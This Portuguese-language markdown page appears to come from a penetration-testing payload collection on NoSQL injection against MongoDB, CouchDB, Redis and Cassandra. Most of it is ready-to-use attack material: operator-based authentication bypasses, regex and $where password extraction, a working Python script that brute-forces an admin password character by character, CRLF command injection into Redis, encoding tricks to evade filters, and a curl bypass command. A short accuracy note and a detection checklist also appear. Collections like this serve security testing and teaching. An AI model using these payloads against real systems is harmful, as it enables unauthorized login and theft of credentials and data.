# 🍃 Payloads de injeção NoSQL

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](NoSQL-Injection.el.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> **Notas de precisão:** Os operadores só são injetáveis quando a aplicação e o parser deixam a entrada alterar a estrutura da consulta. Na sintaxe documentada de [MongoDB](https://www.mongodb.com/docs/manual/reference/operator/query/where/), `$where` é uma condição de consulta, não um operador arbitrário dentro de um campo; o exemplo aninhado em username não é equivalente ao exemplo de nível superior. O script de extração não escapa caracteres especiais de regex nem confirma de forma robusta o fim da palavra-passe. Em [CQL](https://cassandra.apache.org/doc/latest/cassandra/developing/cql/dml.html), as restrições de WHERE não são as mesmas de SQL: os exemplos OR não são um contorno genérico válido, e ALLOW FILTERING não concede autorização. Os comentários dos blocos JSON são explicações editoriais, não JSON estrito.

---

<a id="-mongodb-injection"></a>
## 🎯 Injeção MongoDB

### Contorno da autenticação
```javascript
// Injeção JSON
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// Codificado como URL
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Operadores comuns
```javascript
$eq     // Igual
$ne     // Diferente
$gt     // Maior do que
$gte    // Maior ou igual
$lt     // Menor do que
$lte    // Menor ou igual
$in     // Incluído no array
$nin    // Não incluído no array
$regex  // Expressão regular
$exists // O campo existe
$or     // OU lógico
$and    // E lógico
$where  // Expressão JavaScript
```

---

<a id="-basic-payloads"></a>
## 💉 Payloads básicos

### Injeção em parâmetros de URL
```
# Contorno da autenticação
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Condições sempre verdadeiras
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### Injeção no corpo JSON
```json
// Contorno básico
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Contorno através de expressão regular
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Condição OU
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Maior do que
{"username": "admin", "password": {"$gt": ""}}
```

---

<a id="-data-extraction"></a>
## 🔥 Extração de dados

### Extração baseada em expressões regulares
```javascript
// Extrair a palavra-passe carácter a carácter
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Extrair por posição
password[$regex]=^.{0}a.*   // O primeiro carácter é 'a'?
password[$regex]=^.{1}b.*   // O segundo carácter é 'b'?

// Caracteres comuns
password[$regex]=^[a-z].*   // Começa por minúscula
password[$regex]=^[A-Z].*   // Começa por maiúscula
password[$regex]=^[0-9].*   // Começa por um algarismo
```

### Script de extração cega booleana
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

<a id="-advanced-payloads"></a>
## 🚀 Payloads avançados

### Injeção JavaScript através de $where
```javascript
// Baseada em espera (injeção cega baseada no tempo)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Extração de dados
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Baseada em erros
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Injeção de arrays
```json
// Operador $in
{"username": {"$in": ["admin", "administrator", "root"]}}

// Operador $nin
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Injeção de operadores
```
# Converter o campo num operador
username=admin&password[$ne]=wrongpassword

# Operador aninhado
username[$eq]=admin&password[$regex]=^p

# Vários operadores
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

<a id="-couchdb-injection"></a>
## 🍃 Injeção CouchDB

### Payloads básicos
```javascript
// Contorno da autenticação
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Expressão regular
{"selector": {"username": {"$regex": ".*"}}}

// Maior do que
{"selector": {"password": {"$gt": null}}}
```

### Injeção em views
```javascript
// Injeção em consultas Mango
{"selector": {"_id": {"$gt": null}}}

// Obter todos os documentos
{"selector": {"_id": {"$regex": ".*"}}}
```

---

<a id="-redis-injection"></a>
## 🔴 Injeção Redis

### Comandos básicos
```redis
# Enumeração de chaves
KEYS *
SCAN 0

# Extração de dados
GET key_name
HGETALL hash_name

# Definir dados
SET key value
HSET hash field value
```

### Injeção de comandos através da aplicação
```
# Se os dados introduzidos pelo utilizador forem incorporados em comandos Redis
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

<a id="-cassandra-injection"></a>
## 📊 Injeção Cassandra

### Injeção CQL
```sql
-- Injeção básica
' OR '1'='1
' OR ''='

-- Contorno com ALLOW FILTERING (indicação do original; ver nota)
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Injeção de comentários
admin'--
admin'/*
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Técnicas de contorno de proteções

### Codificação URL
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Contorno através de Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Variações da sintaxe de arrays
```
# Padrão
password[$ne]=

# Alternativa
password[0][$ne]=
password[][$ne]=
```

### Manipulação de Content-Type
```
# Mudar de formulário para JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

<a id="-injection-points"></a>
## 📝 Pontos de injeção

```
POST /login
- Parâmetros do corpo (JSON/formulário)
- Parâmetros da query string

GET /users?id=
- Parâmetros da consulta

Cabeçalhos:
- Authorization (autorização)
- Valores dos cookies

Endpoints de API:
- GraphQL com backend MongoDB
- Filtros de API REST
```

---

<a id="-detection-checklist"></a>
## 🔍 Lista de verificação de deteção

```markdown
□ Testar o operador $ne: {"field": {"$ne": ""}}
□ Testar o operador $gt: {"field": {"$gt": ""}}
□ Testar $regex: {"field": {"$regex": ".*"}}
□ Testar $where: {"$where": "1==1"}
□ Testar a sintaxe de arrays em URL: field[$ne]=
□ Testar operadores JSON
□ Procurar diferenças nos tempos de resposta
□ Procurar diferenças nos comprimentos das respostas
□ Testar com tipos de conteúdo diferentes
```

---

<a id="-tools"></a>
## 🔗 Ferramentas

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# Analisador de injeção MongoDB
nuclei -t nosql-injection.yaml -u http://target

# Testes manuais com curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

<a id="-related-payloads"></a>
## 🔗 Payloads relacionados

- [Payloads de SQLi](SQLi.pt.md)
- [Injeção GraphQL](GraphQL-Injection.pt.md)

---

**Voltar aos payloads:** [💉 Coleção de payloads](../../README.md#-payloads-collection)
